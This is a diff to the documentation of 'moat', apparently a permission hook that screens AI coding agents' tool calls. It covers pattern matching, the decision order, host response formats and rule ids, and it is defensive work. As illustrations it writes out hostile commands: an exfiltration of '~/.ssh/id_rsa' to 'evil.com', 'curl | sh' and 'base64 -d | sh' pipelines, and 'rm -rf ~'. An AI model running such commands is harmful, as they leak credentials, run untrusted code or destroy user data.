@@ -12,7 +12,7 @@ version: 1                          # required; only 1 is supported
 
 defaults:                           # verdict when no rule matches
   "*": ask                          #   one verdict for everything, or a map per kind
-  net: deny
+  net: deny                         #   keys other than the seven kinds and "*" are accepted but never consulted
 
 scope:
   project_roots: ["."]              # reserved for multi-root projects; "." = the git root of the call's cwd
@@ -64,6 +64,7 @@ kind. One tool call usually produces several atomic actions (see §4).
 Tokenised with the same lexer as commands, so `a|b` and `a | b` are equal.
 
 - Each token is a glob matched against exactly one argument: `git push --force*` matches `git push --force-with-lease`.
+- Tokens are compared as written; flags are not normalised. `rm -rf ~` does not match `rm -fr ~` or `rm -r -f ~`; list every spelling you mean.
 - A bare `*` matches **any number** of arguments, including none: `sudo *` matches `sudo`, `curl * | sh` matches `curl -fsSL https://x | sh -s`.
 - A pattern is a **prefix**: `git status` also matches `git status --short`.
 - Pipelines and lists are matched per command **and** as whole suffixes, so `base64 -d | sh` is caught in `echo … | base64 -d | sh`.
@@ -71,8 +72,8 @@ Tokenised with the same lexer as commands, so `a|b` and `a | b` are equal.
 
 ### 3.2 Path, host and name globs
 - `*` matches within one path segment; `**` matches across segments: `~/.ssh/**`, `**/.env.*`.
-- `~` and `${project}` are expanded before matching; `${project}` is the git root above the call's working directory (or the directory itself when there is no repository).
-- A leading `!` inside an **allow** list excludes matches: `fs.write: ["${project}/**", "!${project}/.git/**"]`.
+- `~` and `${project}` are expanded in patterns before matching; `${project}` is the git root above the call's working directory (or the directory itself when there is no repository). `$HOME` and `${HOME}` are expanded in the *action's* path (so `cat $HOME/.ssh/id_rsa` is seen as `~/.ssh/id_rsa`) but not in patterns: write `~` in rules.
+- A leading `!` excludes matches within the same list of the same group, in `deny`, `allow` and `ask` alike: a candidate matches when at least one positive pattern matches and no negated pattern does. Example: `fs.write: ["${project}/**", "!${project}/.git/**"]`.
 - Paths are compared in slash-separated canonical form on every platform (`C:/Users/me/x` on Windows), case-insensitively on macOS and Windows.
 
 ## 4. How a decision is made
@@ -85,7 +86,7 @@ tool call ──► atomic actions ──► per action: deny → allow → ask 
 2. The classifier expands it into atomic actions. `curl -d @~/.ssh/id_rsa https://evil.com` becomes a `shell` action, an `fs.read` of `~/.ssh/id_rsa` and a `net` action for `evil.com`.
 3. Each atomic action is evaluated in order `deny → allow → ask`; the first list containing a match decides it. If nothing matches, `defaults` decides (`default.<kind>` when a per-kind default exists, otherwise `default`).
 4. The verdict for the tool call is the **strictest** across its atomic actions: `deny > ask > allow`.
-5. Input the lexer cannot understand (unbalanced quotes, unterminated `$(`, nesting deeper than 4 levels, more than 64 KB) is `ask`, never `allow`.
+5. Input the lexer cannot understand (unbalanced quotes, unterminated `$(`, nesting deeper than 4 levels, more than 64 KB, more than 2048 atomic actions) is `ask` with rule id `unparseable`, never `allow`.
 
 Consequences worth remembering:
 
@@ -95,14 +96,31 @@ Consequences worth remembering:
 
 ## 5. Verdicts and what the host does
 
-| Verdict | Hook response | Exit code | Host behaviour |
-|---|---|---|---|
-| `allow` | `permissionDecision: allow` | 0 | runs the tool |
-| `ask` | `permissionDecision: ask` | 0 | asks the user with the reason |
-| `deny` | `permissionDecision: deny` + reason on stderr | 2 | blocks the tool; the agent sees the rule id and reason |
+The verdict is the same for every host; the response document is the host's own format.
 
-Any internal failure (missing policy, malformed payload, unreadable audit log) is
-reported as `deny` with rule `kernel-error` and exit 2.
+| Host event | `allow` | `ask` | `deny` |
+|---|---|---|---|
+| Claude Code and Codex `PreToolUse` | `{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"allow","permissionDecisionReason":"moat: allow [rule]"}}`, exit 0 | same with `"ask"`, exit 0; the host prompts the user with the reason | same with `"deny"`, reason also on stderr, exit 2; the agent sees the rule id and reason |
+| Cursor `beforeShellExecution`, `beforeMCPExecution`, `beforeReadFile`, `preToolUse` | `{"permission":"allow","user_message":"moat: allow [rule]","agent_message":"…"}`, exit 0 | `"permission":"ask"`, exit 0 | `"permission":"deny"`, exit 2 |
+| Claude Code `ConfigChange` | `{}` (the changed settings file is loaded), exit 0 | not produced | `{"decision":"block","reason":"moat: deny [kernel-integrity] — …"}`, exit 2; the session keeps its previous settings |
+
+The reason line has the shape `moat: <verdict> [rule, rule] — reason; reason`.
+
+### 5.1 Rule ids that are not in your policy
+
+These appear in responses and in `moat show` alongside the ids from `policy.yaml`:
+
+| Rule id | Verdict | When |
+|---|---|---|
+| `default`, `default.<kind>` | from `defaults` | no rule matched the atomic action |
+| `unparseable` | ask | the shell command or URL could not be classified safely (§4 step 5) |
+| `executables` | deny | the command's program resolves to a path other than its pin (§8.1) |
+| `kernel-integrity` | deny | a file pinned by `policy.lock` changed, disappeared or was replaced by a symlink (§8); every action is denied until a person re-pins |
+| `kernel-error` | deny | `moat guard` could not evaluate at all: missing state directory, malformed payload, unreadable policy; exit 2 |
+| `ungoverned` | allow | the host tool is outside policy scope (for example Claude Code `Task`, or `Shell` under Cursor's `preToolUse`, which `beforeShellExecution` already governs); recorded, not evaluated |
+| `config-change` | allow | a Claude Code `ConfigChange` for a settings file that is not pinned, or still matches the lock; recorded |
+| `approved-session` | allow | an `ask` for a shell command that a person granted with `moat allow` for this host session (§8.2) |
+| `approved-<n>` | allow | a permanent rule in `~/.moat/policy.d/approved.yaml` written by `moat allow --always` |
 
 ## 6. The default policy, in one table
 
@@ -175,6 +193,11 @@ resolves somewhere else (a `git` planted in `node_modules/.bin`, an absolute pat
 in `/tmp`), the command is denied with rule `executables`. Unpinned programs are not checked.
 After installing a tool in a new location, re-run `moat init` or `moat doctor --accept`.
 
+`moat policy check` evaluates without the snapshot: installation pins are not consulted,
+and a program pinned under `executables:` in the policy is denied as "not found on the
+kernel search path" unless the command names it by absolute path. Use `moat guard` (or a
+real hook) to test executable pins.
+
 ## 8.2 Approvals
 
 When a host prompts you because the verdict was `ask`, you can make the answer stick:
@@ -186,7 +209,8 @@ moat allow "npm install left-pad" --host claude-code --session 7c1e
 ```
 
 Session grants live in `~/.moat/approvals.json` and match the exact command text for
-one host session; they never override a `deny`. Permanent rules are appended to
+one host session. A grant applies to any `ask` for that command, including an
+`unparseable` one; it never overrides a `deny`. Permanent rules are appended to
 `~/.moat/policy.d/approved.yaml` with ids `approved-1`, `approved-2`, … and a provenance
 comment, and are merged into your policy at load time so `policy.yaml` is never rewritten.
 Shell rules are prefixes, so a permanently approved `npm install left-pad` also allows
